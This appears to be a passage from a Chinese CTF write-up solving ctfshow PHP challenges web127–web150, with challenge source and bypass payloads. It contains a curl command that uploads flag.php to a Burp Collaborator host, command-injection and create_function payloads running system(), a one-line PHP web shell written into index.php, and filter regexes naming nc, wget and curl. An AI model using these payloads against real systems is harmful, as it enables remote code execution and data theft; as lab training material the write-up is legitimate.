if($ctf_show==='ilove36d'){
    echo $flag;
} 
```

[extract(提取、抽取)函数](https://www.runoob.com/php/func-array-extract.html)：通常情况结合数组使用

?ctf_show=ilove36d但是下划线被过滤了

自己写个fuzz脚本跑一下：

```plaintext
<?php
function waf($num){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $num)){
        return false;
    }else{
        return true;
    }
}
for($i = 0; $i<129; $i++){
	$num=chr($i);
	if(waf($num)){
		echo "未编码：".$num."   经过编码：".urlencode(chr($i))."\n";
	}
}
?>
```

但是这里我们的目的是利用空格、点、左中括号、+来被自动转换为下划线，经过fuzz得到空格，但是不知道为什么我空格经过URL编码确是+，但是%20确实符合该题目

```plaintext
?ctf%20show=ilove36d
```

# web128

```php
 <?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL 
```

**[gettext()](https://www.cnblogs.com/lost-1987/articles/3309693.html)拓展函数的用法**：

```plaintext
_()是gettext()的拓展函数
在开启相关设定后，_("666")等价于gettext("666")，且就返回其中的参数

<?php
echo gettext(666);   //输出 666
echo "\n";
echo _("666");		//输出 666
?>
```

[get_defined_vars()函数](https://www.runoob.com/php/php-get_defined_vars-function.html)：返回由所有已定义变量所组成的数组 ，very顾名思义

因为$flag属于是被定义变量的范畴，所以利用`?f1=_&f2=get_defined_vars`

```plaintext
var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
var_dump(call_user_func(get_defined_vars));
var_dump(get_defined_vars);
```

# web129

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
} 
```

[stripos()函数](https://php.p2hp.com/manual/zh/function.stripos.php)

[readfile()函数](https://php.p2hp.com/manual/zh/function.readfile.php)：`?f=/ctfshow/../../../../../../../var/www/html/flag.php`直接读就完事了

# web130

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

php特性：

preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0

if(0 === flase)返回值为false0不是强等于false的

stripos()函数对数组不识别，遇到数组会返回false

方法一：

```plaintext
?f=ctfshow[]
```

方法二：

使用数组绕过

```plaintext
?f[]=666
```

方法三：

**p神**：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

溢出回溯限制

利用脚本：

```python
import requests
url="http://.ctf.show:8080/"
data={
    'f':'very'*250000+'ctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```

# web131

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

# web132

首先打开是一个网页，御剑扫一下有robots.txt和admin/index.php

打开admin/index.php得到源码

```php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

本题很简单只需要让`username=admin&&code=admin`即可当然也要满足第一个条件

# web133

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
} 
```

[substr()函数](https://php.p2hp.com/manual/zh/function.substr.php)

[shell_exec()函数](https://php.p2hp.com/manual/zh/function.shell-exec.php)

`这个题是自己出的主要是考察，命令执行的骚操作和curl -F的使用`  
 分析一下代码发现仿佛是只能读取前面6个字符去执行命令，禁止了命令执行的函数，并且没有写入权限。可能利用就比较可能  
 但是，如果我们传递的参数就是`$F`本身，会不会发生变量覆盖？  
 那我们来一个简单的测试,

```plaintext
我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令
**那为什么会这样？**
因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数
这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。
而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是
``$F`;+sleep 3`,就执行成功
这里可能有点绕，慢慢理解
```

[curl 的参数用法](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)

然后就是利用curl去带出flag.php  
 `curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）`

[Collaborator Client用法](https://zhuanlan.zhihu.com/p/473336511)

```plaintext
# payload 
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件 
?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
```

使用方法：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201015162350800.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201015162406514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDkxNDY0,size_16,color_FFFFFF,t_70#pic_center)

# web 134

```plaintext
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-14 23:01:06

*/

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
} 
```

简单的函数绕过：

[$_SERVER函数](https://blog.csdn.net/qq_49480008/article/details/115872899)

[extract()函数](https://www.w3school.com.cn/php/func_array_extract.asp)

```plaintext
?_POST[key1]=36d&&_POST[key2]=36
```

# web 135

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
} 
```

```plaintext
?F=`$F` ;cp flag.php 666.txt
?F=`$F` ;nl flag.php>666.txt
?F=`$F` ;mv flag.php 666.txt
```

# web 136

```plaintext
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

[Linux tee命令](https://blog.csdn.net/jjlovefj/article/details/83176871)

```plaintext
常见用例： tee file //覆盖
tee -a file //追加
tee - //输出到标准输出两次 tee - - //输出到标准输出三次
tee file1 file2 - //输出到标准输出两次,并写到那两个文件中
ls | tee file
```

payload：

```php
?c=ls \|tee 1
//将根目录下的内容写入1
访问1，下载文件发现f149_15_h3r3
?c=nl /f149_15_h3r3|tee 1
访问1，下载文件得flag
```

# web 137

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']);
```

调用类中函数，需要调用静态类

```plaintext
php中 ->与:: 调用类中的成员的区别
->用于动态语境处理某个类的某个实例
::可以调用一个静态的、不依赖于其他初始化的类方法
123
```

payload：`ctfshow=ctfshow::getFlag`

# web 138

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

php特性：

考察了call_user_func()用数组形式调用类方法

详看：根据方法名调用call_user_func()详解

```plaintext
call_user_func(array($classname, 'say_hello'));
调用classname这个类里的sya_hello方法

array[0]=$classname  类名
array[1]=say_hello   say_hello()方法
```

call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。

```plaintext
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

# web 139

```php
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

# web 140

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

查看[PHP类型比较表](https://www.php.net/manual/zh/types.comparisons.php) 可发现

`eval`函数的返回值默认是false，但是如果包含的语句中有return，则返回return的值

**`0==“字符串”` 返回的是TRUE**

`intval`会将非数字字符转换为0，也就是说 `intval('a')==0 intval('.')==0 intval('/')==0`

```plaintext
md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1
```

# web 141

```php
 <?php

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

[绕过无字母数字的方法参考yu师傅的脚本](https://blog.csdn.net/miuzzx/article/details/109143413)：这里直接利用取反脚本

绕过return的方式：  
php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）

# web 142

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```

```plaintext
payload:
?v1=0   	八进制
?v1=0x0		16进制
?v1=0e123	科学计数法
```

# web 143

```php
 <?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

更改正则使用异或绕过

# web 144

```php
 <?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
} 
```

# web 145

```php
 <?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

测试：

```php
eval("return 1?phpinfo():1;");
```

这是可以运行出来的

没有过滤~直接取反绕过

# web 146

```php
 <?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符

```php
eval("return 1==phpinfo()||1;");
```

直接取反绕过即可

# web 147

```php
 <?php

highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

} 
```

**分析正则表达式：**  
 `/i`不区分大小写  
 `/s`匹配任何不可见字符，包括空格、制表符、换页符等等，等价于`[\f\n\r\t\v]`  
 `/D`如果使用$限制结尾字符,则不允许结尾有换行

**create_function:**

[参考这篇文章第一道题](https://paper.seebug.org/755/)

```plaintext
create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。

string create_function    ( string $args   , string $code   )

string $args 参数部分
string $code 方法代码部分

举例：

create_function('$name','echo $fname."Zhang"')
类似于：

function fT($name) {
  echo $fname."Zhang";
}
```

绕过匹配的方式很简单：需要在开头或者结尾找到一一个字符同时不影响函数的正常调用

现场制作一个fuzz用的字典：

```php
<?php
$myfile = fopen("ascii.txt","w");
for($i = 0;$i < 129; $i++){
	$a = chr($i);
	if(!preg_match('/[a-z0-9]/isD',$a)){
		preg_replace('/[a-z0-9]/isD','',$a);
		$b = urlencode($a)."\n";
		//$c = "未编码：".$a."经过编码：".$b."\n";
		fwrite($myfile,$b);
	}
	//echo $c;
}
fclose($myfile);
?>
```

然后复制本题目代码本地搭建：开始寻找命中字符

先构造payload：

```plaintext
create_function('',$_GET['show'])
function hacker($hackername) {
	}echo "yn8rt";//
}
所以：
create_function('','}echo "yn8rt";//')
payload:
?show=}echo "yn8rt";//
post:ctf=%create_function
```

开始fuzz：

![img](https://img-blog.csdnimg.cn/img_convert/9d8148dd7353af8c807d7e233b2a3037.png)

payload：

?show=}system(‘tac f*’);//

ctf=%5ccreate_function

而事实上%5c就是\：

在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法

# web 148

```php
 <?php

include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
} 
```

```plaintext
code=$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
"`{{{"^"?<>/"; 异或出来的结果是 _GET
${_GET}[哼](${_GET}[嗯]);&哼=call_user_func&嗯=get_ctfshow_fl0g
```

这里是直接一个回调，利用现成的函数来读取flag.php

# web 149

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

方法一：

你不删除index.php，那么我就往index.php中写个木马

```
?ctf=index.php
show=<?php @eval($_POST['yn8rt']);?>
```

方法二：

条件竞争：

```plaintext
?ctf=1.php
show=<?php system('tac /f*');?>
```

# web 150

```php
 <?php

include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}
```
